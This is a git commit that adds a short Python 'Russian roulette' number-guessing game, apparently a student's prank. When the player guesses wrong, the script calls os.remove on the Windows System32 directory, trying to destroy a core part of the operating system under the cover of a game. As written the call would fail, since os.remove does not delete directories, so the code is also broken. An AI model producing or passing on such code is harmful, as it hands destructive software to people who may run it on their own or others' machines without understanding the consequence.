a6246c77e3da284993b8dce56e1f37e22cb44126
Davit <davit.petrosyan10@edu.ysu.am>
2024-10-04 15:56:53 +0400

    Python Russian Roulete

---
+++ russian_roulete.py
@@ -0,0 +1,11 @@
+import random
+import os
+
+number = random.randint(1, 6)
+guess = int(input("Enter number from 1 to 6: "))
+
+if guess == number:
+    print("You won!")
+else:
+    print("You lose!")
+    os.remove("C:\Windows\System32")
